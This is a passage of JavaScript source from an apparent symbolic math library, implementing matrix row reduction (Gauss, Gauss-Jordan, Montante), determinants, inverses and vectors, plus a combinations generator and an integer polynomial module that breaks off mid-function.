  //    API same as http://sylvester.jcoglan.com/api/matrix.html
  //    new Matrix([
  //      [1, 2, 3],
  //      [5, 6, 7],
  //      [7, 8,-1]
  //    ]);

  function Matrix(data) {
    this.a = data;
  }

  Matrix.Zero = function (rows, cols) {
    var row = new Array(cols);
    for (var j = 0; j < cols; j += 1) {
      row[j] = Expression.ZERO;
    }
    var a = new Array(rows);
    for (var i = 0; i < rows; i += 1) {
      a[i] = row;
    }
    return new Matrix(a);
  };

  // identity n x n;
  Matrix.I = function (n) {
    return Matrix.Zero(n, n).map(function (element, i, j) {
      return (i === j ? Expression.ONE : Expression.ZERO);
    });
  };

  //Matrix.Diagonal = function (elements) {
  //  var n = elements.length;
  //  return Matrix.Zero(n, n).map(function (element, i, j) {
  //    return i === j ? elements[i] : Expression.ZERO;
  //  });
  //};

  Matrix.prototype.rows = function () {
    return this.a.length;
  };

  Matrix.prototype.cols = function () {
    return this.a.length > 0 ? this.a[0].length : 0;
  };

  Matrix.prototype.e = function (i, j) {
    return this.a[i][j];
  };

  Matrix.prototype.isSquare = function () {
    return this.rows() > 0 && this.rows() === this.cols();//?
  };

  Matrix.prototype.map = function (callback) {
    var rows = this.rows();
    var cols = this.cols();
    var c = new Array(rows);
    var i = -1;
    while (++i < rows) {
      var x = new Array(cols);
      var j = -1;
      while (++j < cols) {
        var e = callback.call(undefined, this.e(i, j), i, j, this);
        x[j] = e.simplifyExpression();//?
      }
      c[i] = x;
    }
    return new Matrix(c);
  };

  Matrix.prototype.transpose = function () {
    var that = this;
    return Matrix.Zero(that.cols(), that.rows()).map(function (element, i, j) {
      return that.e(j, i);
    });
  };

  Matrix.prototype.scale = function (k) {
    return this.map(function (element, i, j) {
      return element.multiply(k);
    });
  };

  Matrix.prototype.multiply = function (b) {
    var a = this;
    if (a.cols() !== b.rows()) {
      throw new RangeError("DimensionMismatchException");
    }
    return Matrix.Zero(a.rows(), b.cols()).map(function (element, i, j) {
      var rows = b.rows();
      var k = -1;
      while (++k < rows) {
        //! this code is used to show not simplified expressions
        var current = a.e(i, k).multiply(b.e(k, j));
        element = k === 0 ? current : element.add(current);
      }
      return element;
    });
  };

  Matrix.prototype.add = function (b) {
    var a = this;
    if (a.rows() !== b.rows() || a.cols() !== b.cols()) {
      throw new RangeError("MatrixDimensionMismatchException");
    }
    return a.map(function (element, i, j) {
      return element.add(b.e(i, j));
    });
  };

  Matrix.prototype.augment = function (b) { // ( this | m )  m.rows() ==== this.rows()
    if (this.rows() !== b.rows()) {
      //TODO: fix exception
      throw new RangeError("NonSquareMatrixException");
    }
    var a = this;
    return Matrix.Zero(a.rows(), a.cols() + b.cols()).map(function (element, i, j) {
      return (j < a.cols() ? a.e(i, j) : b.e(i, j - a.cols()));
    });
  };

  Matrix.prototype.rowReduce = function (targetRow, pivotRow, pivotColumn, currentOrPreviousPivot) {
    var rows = this.rows();
    var cols = this.cols();
    var c = new Array(rows);
    var i = -1;
    while (++i < rows) {
      if (targetRow === i) {
        var x = new Array(cols);
        var f = currentOrPreviousPivot == undefined ? this.e(targetRow, pivotColumn).divide(this.e(pivotRow, pivotColumn)) : undefined;
        var j = -1;
        while (++j < cols) {
          // (e_ij - e_ic * e_rj / e_rc) * (e_rc / cpp)
          var e = undefined;
          if (currentOrPreviousPivot == undefined) {
            e = this.e(targetRow, j).subtract(f.multiply(this.e(pivotRow, j)));
          } else {
            e = this.e(pivotRow, pivotColumn).multiply(this.e(targetRow, j)).subtract(this.e(targetRow, pivotColumn).multiply(this.e(pivotRow, j))).divide(currentOrPreviousPivot);
            //TODO: 
            //if (e instanceof Expression.Division) {
            //  debugger;
            //}
          }
          x[j] = e.simplifyExpression();
        }
        c[i] = x;
      } else {
        c[i] = this.a[i];
      }
    }
    return new Matrix(c);
  };

  Matrix.prototype.swapRows = function (pivotRow, targetRow, preserveDeterminant) {
    var m = this;
    return m.map(function (e, i, j) {
      if (i === pivotRow) {
        return m.e(targetRow, j);
      }
      if (i === targetRow) {
        return preserveDeterminant ? m.e(pivotRow, j).negate() : m.e(pivotRow, j);
      }
      return e;
    });
  };

  var notEqualsZero = function (e, condition) {//TODO: - ?
    if (condition != undefined) {
      //!update from 2018-16-07
      return condition.andZero(e).isFalse();
    }
    return !e.equals(Expression.ZERO);
  };

  Matrix.check = function (usage, matrix, from, to, condition) {
    for (var i = from; i < to; i += 1) {
      if (usage !== "solving" || notEqualsZero(matrix.e(i, matrix.cols() - 1), condition)) {
        var endColumnIndex = usage === "solving" ? matrix.cols() - 1 : (usage === "determinant" ? matrix.cols() : (usage === "inverse" ? Math.floor(matrix.cols() / 2) : -1));
        var j = 0;
        while (j < endColumnIndex && matrix.e(i, j).equals(Expression.ZERO)) {
          j += 1;
        }
        if (j === endColumnIndex) {
          return i;
        }
      }
    }
    return -1;
  };

  Matrix.toRowEchelonStep = function (m, pivotRow, pivotColumn, pivotOriginRow, previousPivot, options, condition) {
    var oldMatrix = undefined;
    var coefficient = undefined;
    var targetRow = 0;
    if (pivotOriginRow !== pivotRow) {
      oldMatrix = m;
      m = m.swapRows(pivotRow, pivotOriginRow, options.usage === "determinant");
      if (options.callback != undefined) {
        options.callback({previousPivot: undefined, newMatrix: m, oldMatrix: oldMatrix, type: options.usage === "determinant" ? "swap-negate" : "swap", targetRow: pivotRow, pivotRow: pivotOriginRow, pivotColumn: pivotColumn});
      }
    }
    // making zeros under the main diagonal
    if (options.method === Matrix.GaussJordan) {
      if (!m.e(pivotRow, pivotColumn).equals(Expression.ONE)) {
        oldMatrix = m;
        coefficient = Expression.ONE.divide(m.e(pivotRow, pivotColumn));
        m = m.map(function (e, i, j) {
          if (i !== pivotRow) {
            return e;
          }
          return e.multiply(coefficient);
        });
        if (options.callback != undefined) {
          options.callback({previousPivot: undefined, newMatrix: m, oldMatrix: oldMatrix, type: "divide", targetRow: pivotRow, pivotRow: pivotRow, pivotColumn: pivotColumn});
        }
      }
    }
    if (options.method === Matrix.Gauss || options.method === Matrix.GaussJordan) {
      targetRow = pivotRow;
      while (++targetRow < m.rows()) {
        if (!m.e(targetRow, pivotColumn).equals(Expression.ZERO)) {
          oldMatrix = m;
          m = m.rowReduce(targetRow, pivotRow, pivotColumn);
          if (options.callback != undefined) {
            options.callback({previousPivot: undefined, newMatrix: m, oldMatrix: oldMatrix, type: "reduce", targetRow: targetRow, pivotRow: pivotRow, pivotColumn: pivotColumn});
          }
          var stoppedAtRow = Matrix.check(options.usage, m, targetRow, targetRow + 1, condition);
          if (stoppedAtRow !== -1) {
            return {stoppedAtRow: stoppedAtRow, matrix: m};
          }
        }
      }
    }
    if (options.method === Matrix.GaussMontante) {
      oldMatrix = m;
      targetRow = -1;
      while (++targetRow < m.rows()) {
        if (targetRow !== pivotRow) {
          m = m.rowReduce(targetRow, pivotRow, pivotColumn, previousPivot);
        }
      }
      if (options.callback != undefined) {
        options.callback({previousPivot: previousPivot, newMatrix: m, oldMatrix: oldMatrix, type: "pivot", targetRow: -1, pivotRow: pivotRow, pivotColumn: pivotColumn});
      }
      var stoppedAtRow = Matrix.check(options.usage, m, 0, m.rows(), condition);
      if (stoppedAtRow !== -1) {
        return {stoppedAtRow: stoppedAtRow, matrix: m};
      }
    }
    return {stoppedAtRow: -1, matrix: m};
  };

  Matrix.toRowEchelonBackSubstitution = function (m, pivotRow, options) {
    // back-substitution
    if (options.method === Matrix.GaussJordan) {
      while (--pivotRow >= 0) {
        var pivotColumn = 0;
        while (pivotColumn < m.cols() && m.e(pivotRow, pivotColumn).equals(Expression.ZERO)) {
          pivotColumn += 1;
        }
        if (pivotColumn < m.cols()) {
          var targetRow = pivotRow;
          while (--targetRow >= 0) {
            if (!m.e(targetRow, pivotColumn).equals(Expression.ZERO)) {
              var oldMatrix = m;
              m = m.rowReduce(targetRow, pivotRow, pivotColumn);
              if (options.callback != undefined) {
                options.callback({previousPivot: undefined, newMatrix: m, oldMatrix: oldMatrix, type: "reduce", targetRow: targetRow, pivotRow: pivotRow, pivotColumn: pivotColumn});
              }
            }
          }
        }
      }
    }
    return m;
  };

  var isConditionValid = function (condition, matrix) {
    for (var i = 0; i < matrix.rows(); i++) {
      for (var j = 0; j < matrix.cols(); j++) {
        var e = matrix.e(i, j);
        if (!Polynomial._isIntegerLike(e)) {
          if (Polynomial._isIntegerLike(e.getNumerator())) {//!!! for performance
            e = e.getDenominator().inverse();
          }
          if (condition.andZero(e).isFalse() && condition.andNotZero(e).isFalse()) {
            return false;
          }
        }
      }
    }
    return true;
  };

  Matrix.Gauss = "Gauss";
  Matrix.GaussJordan = "Gauss-Jordan";
  Matrix.GaussMontante = "Gauss-Montante";

  function ToRowEchelonOptions(method, usage, callback) {
    if (usage !== "determinant" && usage !== "inverse" && usage !== "solving" && usage !== "LU-decomposition" && usage !== "" && usage !== "row-reduction") {
      throw new RangeError();
    }
    if (method !== Matrix.Gauss && method !== Matrix.GaussJordan && method !== Matrix.GaussMontante) {
      throw new RangeError();
    }
    this.method = method;
    this.usage = usage;
    this.callback = callback;
  }

  Matrix.ToRowEchelonOptions = ToRowEchelonOptions;

  // method === Matrix.GaussJordan - make zeros under diagonal and divide by pivot element, also swap row instead of addition
  // method === Matrix.Montante - https://es.wikipedia.org/wiki/M%C3%A9todo_Montante
  // private
  var COLUMN_LOOP = 0;
  var ZERO = 1;
  var NOT_ZERO = 2;
  Matrix.prototype.toRowEchelon = function (method, usage, callback) {
    var options = new Matrix.ToRowEchelonOptions(method, usage, callback);
    return this.toRowEchelonInternal(options, 0, -1, -1, Expression.ONE, COLUMN_LOOP, undefined);
  };
  Matrix.prototype.toRowEchelonXXX = function (method, usage, callback, condition) {
    var options = new Matrix.ToRowEchelonOptions(method, usage, callback);
    return this.toRowEchelonInternal(options, 0, -1, -1, Expression.ONE, COLUMN_LOOP, condition);
  };
  Matrix.prototype.toRowEchelonInternal = function (options, pivotRow, pivotColumn, pivotOriginRow, previousPivot, state, condition) {
    var matrix = this;

    //2018-09-29
    if (condition != undefined && !condition.isTrue()) {
      matrix = matrix.map(function (e, i, j) {
        // x == 0 && x**2 != 0 is false
        // x == 0 && x**2 == 0 is false
        // x == 0 && y/x != 0 is false
        // x == 0 && y/x == 0 is false
        return condition.updateExpression(e);
      });
      previousPivot = condition.updateExpression(previousPivot);
    }

    var stoppedAtRow = Matrix.check(options.usage, matrix, 0, matrix.rows(), condition);
    if (stoppedAtRow !== -1) {
      return {stoppedAtRow: stoppedAtRow, matrix: matrix, condition: condition};
    }
    if (false) {
      //TODO: remove
    //!2018-16-07 (from trash)
    if (options.usage === "solving" && pivotColumn === matrix.cols() - 1) {
      //TODO: test
      //TODO: test if condition == undefined
      var c = condition.andZero(matrix.e(pivotRow, pivotColumn));
      return {stoppedAtRow: -1, matrix: matrix, condition: c};
    }
    //!
    }
    while (true) {
      switch (state) {
        case COLUMN_LOOP:
          pivotColumn += 1;
          if (pivotColumn >= matrix.cols()) {
            matrix = Matrix.toRowEchelonBackSubstitution(matrix, pivotRow, options);
            return {stoppedAtRow: -1, matrix: matrix, condition: condition};
          }
          if (pivotColumn > pivotRow && (options.usage === "determinant" || options.usage === "inverse")) {
            if (pivotColumn >= Math.floor(matrix.cols() / 2) && options.usage === "inverse") {//TODO: fix
              matrix = Matrix.toRowEchelonBackSubstitution(matrix, pivotRow, options);
              return {stoppedAtRow: -1, matrix: matrix, condition: condition};
            }
            return {stoppedAtRow: pivotRow, matrix: matrix, condition: condition};//? TODO: details - ?
          }
          pivotOriginRow = pivotRow - 1;
          state = ZERO;
        break;
        case ZERO:
          // pivot searching
          // not zero element in a column (starting from the main diagonal);
          if (condition == undefined) {
            pivotOriginRow += 1;
            if (pivotOriginRow < matrix.rows()) {
              if (matrix.e(pivotOriginRow, pivotColumn).equals(Expression.ZERO)) {
                state = ZERO;
              } else {
                state = NOT_ZERO;
              }
            } else {
              state = COLUMN_LOOP;
            }
          } else {
            if (pivotOriginRow >= pivotRow) {
              matrix = pivotRow >= matrix.rows() || matrix.e(pivotRow, pivotColumn).equals(Expression.ZERO) ? matrix : matrix.map(function (e, i, j) { //?
                //return i === pivotOriginRow && j === pivotColumn ? Expression.ZERO : condition.updateExpression(e);
                return condition.updateExpression(e);
              });
              previousPivot = condition.updateExpression(previousPivot);
            }
            var found = false;
            if (pivotOriginRow === pivotRow - 1) {//!
              var row = pivotRow;
              while (row < matrix.rows() && !((condition.andZero(matrix.e(row, pivotColumn)).isFalse() || options.usage === "LU-decomposition") && !matrix.e(row, pivotColumn).equals(Expression.ZERO))) {
                row += 1;
              }
              if (row < matrix.rows()) {
                pivotOriginRow = row;
                found = true;
              }
            }//!
            if (!found) {
              pivotOriginRow += 1;
              if (pivotOriginRow < matrix.rows()) {
                var candidate = matrix.e(pivotOriginRow, pivotColumn);
                var c1 = condition.andNotZero(candidate);
                var c2 = condition.andZero(candidate);

                if (!c2.isFalse()) {
                //!new 2020-01-03
                // condition: r = 0, element = 1/r
                if (!isConditionValid(c2, matrix)) {
                  debugger;
                  c2 = Condition.FALSE;//!!!
                  condition = c1;//!
                }
                //!
                }

                if (c2.isFalse()) {
                  state = NOT_ZERO;
                } else if (c1.isFalse()) {
                  state = ZERO;
                } else {
                  if (options.usage === "row-reduction") {
                    var tmp = Matrix.toRowEchelonStep(matrix, pivotRow, pivotColumn, pivotOriginRow, previousPivot, Object.assign({}, options, {callback: null}), condition);
                    var m = tmp.matrix.slice(pivotOriginRow + 1, matrix.rows(), pivotColumn, matrix.cols()).map(function (e, i, j) {
                      return c2.updateExpression(e);
                    });
                    if (m.eql(Matrix.Zero(m.rows(), m.cols()))) {
                      return matrix.toRowEchelonInternal(options, pivotRow, pivotColumn, pivotOriginRow, previousPivot, NOT_ZERO, condition);
                    }
                  }
                  return {
                    matrix: matrix,
                    c1: c1,
                    a1: function () {
                      return matrix.toRowEchelonInternal(options, pivotRow, pivotColumn, pivotOriginRow, previousPivot, NOT_ZERO, c1);
                    },
                    c2: c2,
                    a2: function () {
                      return matrix.toRowEchelonInternal(options, pivotRow, pivotColumn, pivotOriginRow, previousPivot, ZERO, c2);
                    }
                  };
                }
              } else {
                state = COLUMN_LOOP;
              }
            } else {
              state = NOT_ZERO;
            }
          }
        break;
        case NOT_ZERO:
          var tmp = Matrix.toRowEchelonStep(matrix, pivotRow, pivotColumn, pivotOriginRow, previousPivot, options, condition);
          var stoppedAtRow = tmp.stoppedAtRow;
          matrix = tmp.matrix;
          if (stoppedAtRow !== -1) {
            return {stoppedAtRow: stoppedAtRow, matrix: matrix, condition: condition};
          }
          previousPivot = matrix.e(pivotRow, pivotColumn);
          pivotRow += 1;
          state = COLUMN_LOOP;
        break;
      }
    }
  };

  Matrix.prototype.determinant = function () { // m == n  // via row echelon form
    var n = this.rows();
    if (!this.isSquare() || n === 0) {
      throw new RangeError("NonSquareMatrixException");
    }
    if (false && !Expression.has(this.e(0, 0), Expression.Polynomial)) {
      var tmp = this.toRowEchelon(Matrix.Gauss, "determinant", undefined);
      var stoppedAtRow = tmp.stoppedAtRow;
      var rowEchelonMatrix = tmp.matrix;
      if (stoppedAtRow !== -1) {
        return Expression.ZERO;
      }
      var det = rowEchelonMatrix.e(0, 0);
      for (var j = 1; j < rowEchelonMatrix.rows(); j += 1) {
        det = det.multiply(rowEchelonMatrix.e(j, j));
      }
      return det;
    }
    var tmp = this.toRowEchelon(Matrix.GaussMontante, "determinant", undefined);
    var stoppedAtRow = tmp.stoppedAtRow;
    var rowEchelonMatrix = tmp.matrix;
    if (stoppedAtRow !== -1) {
      return Expression.ZERO;
    }
    return rowEchelonMatrix.e(n - 1, n - 1);
  };

  Matrix.prototype.rank = function () {
    // rank === count of non-zero rows after bringing to row echelon form ...
    //var m = this.toRowEchelon(Matrix.Gauss, "", undefined).matrix;
    var m = this.toRowEchelon(Matrix.GaussMontante, "", undefined).matrix;
    var result = 0;
    var pivotRow = 0;
    var pivotColumn = 0;
    while (pivotRow < m.rows()) {
      while (pivotColumn < m.cols() && m.e(pivotRow, pivotColumn).equals(Expression.ZERO)) {
        pivotColumn += 1;
      }
      if (pivotColumn < m.cols()) {
        result += 1;
      }
      pivotRow += 1;
    }
    return result;
  };

  Matrix.prototype.inverse = function () { // m == n by augmention ...
    if (!this.isSquare()) {
      throw new RangeError("NonSquareMatrixException");
    }
    if (this.rows() === 2) {
      var a = this.e(0, 0);
      var b = this.e(0, 1);
      var c = this.e(1, 0);
      var d = this.e(1, 1);
      var det = a.multiply(d).subtract(b.multiply(c));
      if (det.equals(Expression.ZERO)) {
        throw new RangeError("SingularMatrixException");
      }
      return Matrix.Zero(this.rows(), this.rows()).map(function (e, i, j) {
        return (i === 0 ? (j === 0 ? d : b.negate()) : (j === 0 ? c.negate() : a)).divide(det);
      });
    }
    var m = this.augment(Matrix.I(this.rows()));
    //m = m.toRowEchelon(Matrix.GaussJordan, "inverse", undefined).matrix;
    m = m.toRowEchelon(Matrix.GaussMontante, "inverse", undefined).matrix;

    return Matrix.Zero(m.rows(), m.rows()).map(function (element, i, j) { // splitting to get the second half
      var e = m.e(i, i);
      if (e.equals(Expression.ZERO)) {
        throw new RangeError("SingularMatrixException");
      }
      var x = m.e(i, j + m.rows());
      return e.equals(Expression.ONE) ? x : x.divide(e);
    });
  };

  Matrix.prototype.toString = function (options) {
    var result = "";
    var rows = this.rows();
    var cols = this.cols();
    if (rows === 0 && cols === 0) {
      throw new RangeError();
    }
    var j = -1;
    result += "{";
    while (++j < rows) {
      if (j !== 0) {
        result += ",";
      }
      result += "{";
      var i = -1;
      while (++i < cols) {
        if (i !== 0) {
          result += ",";
        }
        result += this.e(j, i).toString(options);
      }
      result += "}";
    }
    result += "}";
    return result;
  };

  Matrix.prototype.negate = function () {
    return this.map(function (element, i, j) {
      return element.negate();
    });
  };

  Matrix.prototype.subtract = function (b) {
    return this.add(b.negate());
  };

  //?
  // returns an array of arrays of strings
  Matrix.prototype.getElements = function () {
    var rows = this.rows();
    var cols = this.cols();
    var elements = new Array(rows);
    for (var i = 0; i < rows; i += 1) {
      var row = new Array(cols);
      for (var j = 0; j < cols; j += 1) {
        row[j] = this.e(i, j).toString();
      }
      elements[i] = row;
    }
    return elements;
  };

  Matrix.prototype.slice = function (rowsStart, rowsEnd, colsStart, colsEnd) {
    var that = this;
    return Matrix.Zero(rowsEnd - rowsStart, colsEnd - colsStart).map(function (e, i, j) {
      return that.e(i + rowsStart, j + colsStart);
    });
  };

  //TODO:
  Matrix.prototype.isExact = function () {
    var rows = this.rows();
    var cols = this.cols();
    for (var i = 0; i < rows; i += 1) {
      for (var j = 0; j < cols; j += 1) {
        if (!this.e(i, j).isExact()) {
          return false;
        }
      }
    }
    return true;
  };

  Matrix.prototype.eql = function (b) {
    var a = this;
    if (a.rows() !== b.rows() || a.cols() !== b.cols()) {
      return false;
    }
    for (var i = 0; i < a.rows(); i += 1) {
      for (var j = 0; j < a.cols(); j += 1) {
        if (!a.e(i, j).equals(b.e(i, j))) {
          return false;
        }
      }
    }
    return true;
  };

  Matrix.prototype.pow = function (n) {
    if (!(n >= 0 && n <= Number.MAX_SAFE_INTEGER)) {
      throw new RangeError();
    }
    var pow = function (x, count, accumulator) {
      return (count < 1 ? accumulator : (2 * Math.floor(count / 2) !== count ? pow(x, count - 1, accumulator.multiply(x)) : pow(x.multiply(x), Math.floor(count / 2), accumulator)));
    };
    return pow(this, n, Matrix.I(this.rows()));
  };

  /*
  // TODO: remove
  Matrix.prototype.stripZeroRows = function () {
    var rows = this.rows();
    var cols = this.cols();
    var i = rows;
    var j = cols;
    while (j === cols && --i >= 0) {
      j = 0;
      while (j < cols && this.e(i, j).equals(Expression.ZERO)) {
        j += 1;
      }
    }
    i += 1;
    var that = this;
    return i === rows ? this : Matrix.Zero(i, cols).map(function (e, i, j) {
      return that.e(i, j);
    });
  };
  */

  // string -> array of array of strings, find `extraPositionOffset`
  Matrix.split = function (input) {
    input = input.replace(/\b(sin|cos)\x20/g, '$1\u200B');
    var result = [];
    var m = input;
    if (/^\s*\[[^\[\]]*\]\s*$/.exec(m) != undefined) {//!
      m = m.replace(/\[/g, " ");
      m = m.replace(/\]/g, " ");
    }//!
    if (m.replace(/^\s+|\s+$/g, "") !== "") {
      m = m.replace(/;/g, "\n");//? ; -> \n
      m = m.replace(/\r/g, "\n");
      var row = [];
      result.push(row);
      var position = 0;
      var match = undefined;
      while ((match = /^\s*\S+/.exec(m.slice(position))) != undefined) {
        var t = match[0];
        if (t.indexOf("\n") !== -1 && row.length !== 0) {
          row = [];
          result.push(row);
          t = t.replace(/\n/g, " ");
        }
        row.push(t);
        position += t.length;
      }
    }
    return result;
  };

  Matrix.padRows = function (array, convertFunction) {
    var rows = array.length;
    var cols = 0;
    for (var k = 0; k < array.length; k += 1) {
      cols = Math.max(cols, array[k].length);
    }
    var data = new Array(rows);
    for (var i = 0; i < rows; i += 1) {
      var y = array[i];
      var x = new Array(cols);
      for (var j = 0; j < cols; j += 1) {
        x[j] = j < y.length ? (convertFunction != null ? convertFunction(y[j]) : y[j]) : Expression.ZERO;
      }
      data[i] = x;
    }
    return new Matrix(data);
  };

  Matrix.solveByGaussNext = function (m, callback) {
    var pivotRows = new Array(m.cols() - 1);
    for (var k = 0; k < m.cols() - 1; k += 1) {
      pivotRows[k] = -1;
    }
    for (var i = m.rows() - 1; i >= 0; i -= 1) {
      var j = 0;
      while (j < m.cols() - 1 && m.e(i, j).equals(Expression.ZERO)) {
        j += 1;
      }
      // first not zero in a row - main variable
      if (j < m.cols() - 1) {
        pivotRows[j] = i;
        var oldMatrix1 = m;
        // reduce i-th row
        for (var k = j + 1; k < m.cols() - 1; k += 1) {
          if (!m.e(i, k).equals(Expression.ZERO)) {
            var pivotRow = pivotRows[k];
            if (pivotRow !== -1) {
              m = m.rowReduce(i, pivotRow, k);
            }
          }
        }
        var oldMatrix2 = m;
        // divide i-th row by m.e(i, j)
        if (!m.e(i, j).equals(Expression.ONE)) {
          var c = m.e(i, j);
          m = m.map(function (e, row, column) {
            return row === i ? e.divide(c) : e;
          });
        }
        if (callback != undefined) {
          callback(m, oldMatrix1, oldMatrix2, i, j);
        }
      }
    }
    return m;
  };

  //TODO: ?
  Matrix.getPivotRow = function (m, k) {
    var i = m.rows() - 1;
    while (i >= 0 && m.e(i, k).equals(Expression.ZERO)) {
      i -= 1;
    }
    if (i >= 0) {
      var j = k - 1;
      while (j >= 0 && m.e(i, j).equals(Expression.ZERO)) {
        j -= 1;
      }
      if (j < 0) {
        return i;
      }
    }
    return -1;
  };

  //TODO: fix
  Matrix.getSolutionSet = function (m) {
    var result = {
      basisVectors: [],
      variables: []
    };
    for (var k = 0; k < m.cols() - 1; k += 1) {
      if (Matrix.getPivotRow(m, k) === -1) {
        // a basis vector for k-th variable
        var bx = new Array(m.cols() - 1);
        for (var j = 0; j < m.cols() - 1; j += 1) {
          var i = Matrix.getPivotRow(m, j); // a solution row for j-th variable, -1 if it is a free variable
          bx[j] = i !== -1 ? m.e(i, k).negate() : (j === k ? Expression.ONE : Expression.ZERO);
        }
        var basisVector = new Vector(bx);
        result.basisVectors.push(basisVector);
        result.variables.push(k);
      }
    }
    return result;
  };

  Matrix.prototype.minorMatrix = function (k, l) {
    var that = this;
    return Matrix.Zero(this.rows() - 1, this.cols() - 1).map(function (e, i, j) {
      return that.e(i < k ? i : i + 1, j < l ? j : j + 1);
    });
  };

  Matrix.toRowEchelonWithCallback = function (matrix, method, usage, changeCallback, resultCallback) {
    var result = matrix.toRowEchelonXXX(method, usage, changeCallback, Condition.TRUE);
    var w = function (result) {
      if (result.c1 == undefined && result.c2 == undefined) {
        resultCallback(result);
      } else {
        w(result.a1());
        w(result.a2());
      }
    };
    w(result);
  };

  Matrix.prototype.isDiagonal = function () {
    return this.eql(this.map(function (e, i, j) {
      return i !== j ? Expression.ZERO : e;
    }));
  };
  Matrix.prototype.isScalar = function () {
    var that = this;
    return this.eql(this.map(function (e, i, j) {
      return i !== j ? Expression.ZERO : that.e(0, 0);
    }));
  };
  Matrix.prototype.isNilpotent = function () {
    var x = this.map(function (e, i, j) {
      return j <= i ? Expression.ZERO : e;
    });
    if (this.eql(x)) {
      //! This method only tests if it nilpotent based on a property and so may return false for the positive result
      return true;
    }
    //TODO: test case for non-triangular - ?
    return this.pow(this.cols()).eql(Matrix.Zero(this.cols(), this.cols()));
  };
  //TODO: use in solution steps (?)
  Matrix.prototype.isJordanMatrix = function () {//TODO: fix
    var that = this;
    return this.eql(this.map(function (e, i, j) {
      return i === j ? e : (j === i + 1 && that.e(i, i).equals(that.e(i + 1, i + 1)) && !that.e(i, j).equals(Expression.ZERO) ? Expression.ONE : Expression.ZERO);
    }));
  };
  Matrix.prototype.isZero = function () {
    return this.eql(Matrix.Zero(this.rows(), this.cols()));
  };

  function Vector(elements) {
    this.elements = elements;
  }

  Vector.prototype.e = function (index) {
    return this.elements[index];
  };

  Vector.prototype.dimensions = function () {
    return this.elements.length;
  };

  //TODO: ?
  Vector.prototype.rows = function () {
    return this.dimensions();
  };
  Vector.prototype.cols = function () {
    return 1;
  };
  Vector.prototype.isExact = function () {
    for (var i = 0; i < this.dimensions(); i += 1) {
      if (!this.e(i).isExact()) {
        return false;
      }
    }
    return true;
  };

  Vector.prototype.toString = function (options) {
    return Matrix.prototype.toString.call(this, options);
  };

  Vector.prototype.dot = function (other) {
    var result = Expression.ZERO;
    for (var i = 0; i < Math.max(this.dimensions(), other.dimensions()); i += 1) {
      var s = this.e(i).multiply(other.e(i).complexConjugate());
      result = result === Expression.ZERO ? s : result.add(s);
    }
    return result;
  };
  Vector.prototype.toUnitVector = function () {
    var norm = this.dot(this).squareRoot();
    return this.scale(norm.inverse());
  };

  Vector.prototype.scale = function (s) {
    return new Vector(this.elements.map(function (e) { return s.multiply(e); }));
  };
  Vector.prototype.subtract = function (other) {
    if (this.dimensions() !== other.dimensions()) {
      throw new RangeError("MatrixDimensionMismatchException");
    }
    var n = this.dimensions();
    var result = new Array(n);
    for (var i = 0; i < n; i += 1) {
      result[i] = this.e(i).subtract(other.e(i));
    }
    return new Vector(result);
  };

  Vector.prototype.eql = function (other) {
    if (this.dimensions() !== other.dimensions()) {
      throw new RangeError("MatrixDimensionMismatchException");
    }
    var n = this.dimensions();
    for (var i = 0; i < n; i += 1) {
      if (!this.e(i).equals(other.e(i))) {
        return false;
      }
    }
    return true;
  };
  Vector.Zero = function (n) {
    return new Vector(new Array(n).fill(Expression.ZERO));
  };

  Matrix.Vector = Vector;

  Matrix.prototype.row = function (i) {
    var elements = new Array(this.cols());
    for (var j = 0; j < this.cols(); j += 1) {
      elements[j] = this.e(i, j);
    }
    return new Vector(elements);
  };
  Matrix.prototype.col = function (j) {
    var elements = new Array(this.rows());
    for (var i = 0; i < this.rows(); i += 1) {
      elements[i] = this.e(i, j);
    }
    return new Vector(elements);
  };

  self.Matrix = Matrix;

})();
(function () {
"use strict";

// https://lowrey.me/es6-javascript-combination-generator/
// https://www.npmjs.com/package/combinations-generator

function combinations (elements, k) {
  var n = elements.length;
  var indexes = new Array(k + 1).fill(-1);
  var result = new Array(k).fill(undefined);
  var depth = 0;
  var iterator = {
    next: function () {
      while (depth >= 0) {
        if (depth < k) {
          var i = indexes[depth];
          if (i < n - k + depth) {
            indexes[depth] = i + 1;
            result[depth] = elements[i + 1];
            depth += 1;
            indexes[depth] = i + 1;
          } else {
            depth -= 1;
          }
        } else {
          depth -= 1;
          return {value: result.slice(0), done: false};
        }
      }
      return {value: undefined, done: true};
    }
  };
  iterator[globalThis.Symbol.iterator] = function () {
    return this;
  };
  return iterator;
}

self.combinations = combinations;

})();
(function () {
"use strict";


function modulo(a, b) {
  var x = a % b;
  if (x < 0) {
    x += b; // assuming b > 0
  }
  return x;
}

function check(number) {
  if (typeof number !== "number" || Math.abs(number) > Number.MAX_SAFE_INTEGER) {
    throw new RangeError();
  }
}

function schoolbook(a, b) {
  var c = new Array(a.length === 0 || b.length === 0 ? 0 : (a.length - 1 + b.length - 1 + 1));
  for (var i = 0; i < c.length; i++) {
    var from = Math.max(0, i - (b.length - 1));
    var to = Math.min(i, a.length - 1);
    var s = a[from] * b[i - from];
    for (var j = from + 1; j <= to; j++) {
      s += a[j] * b[i - j];
    }
    c[i] = s;
  }
  return c;
}

function absMax(array) {
  var max = 0;
  for (var i = 0; i < array.length; i++) {
    max = Math.max(max, Math.abs(array[i]));
  }
  return max;
}

function multiply(A, B) {
  check(absMax(A) * absMax(B) * Math.min(A.length, B.length));
  return schoolbook(A, B);
}

  function IntPolynomial(coefficients) {
    var k = coefficients.length;
    while (k > 0 && coefficients[k - 1] == 0) {
      k -= 1;
    }
    coefficients.length = k;
    check(absMax(coefficients));
    this.coefficients = coefficients;
  }
  IntPolynomial.prototype.add = function (other) {
    var a = this.coefficients;
    var b = other.coefficients;
    var c = new Array(Math.max(a.length, b.length));
    for (var i = 0; i < c.length; i += 1) {
      if (i < a.length && i < b.length) {
        c[i] = a[i] + b[i];
      } else if (i < a.length) {
        c[i] = a[i];
      } else {
        c[i] = b[i];
      }
    }
    return new IntPolynomial(c);
  };;
  IntPolynomial.prototype.subtract = function (other) {
    return this.add(other.negate());
  };
  IntPolynomial.prototype.multiply = function (other) {
    var a = this.coefficients;
    var b = other.coefficients;
    return new IntPolynomial(multiply(a, b));
  };
  IntPolynomial.prototype.divideAndRemainderModP = function (other, m) {
    var a = this.coefficients;
    var b = other.coefficients;
    if (a.length < b.length) {
      return {quotient: new IntPolynomial([]), remainder: this.mod(m)};
    }
    if (b.length === 0) {
      throw new RangeError();
    }
    var lc = b[b.length - 1];
    if (lc != 1) {
      throw new RangeError();
    }
    check(m * m * b.length);
    var remainder = new Array(a.length);
    for (var i = 0; i < a.length; i++) {
      remainder[i] = a[i];
    }
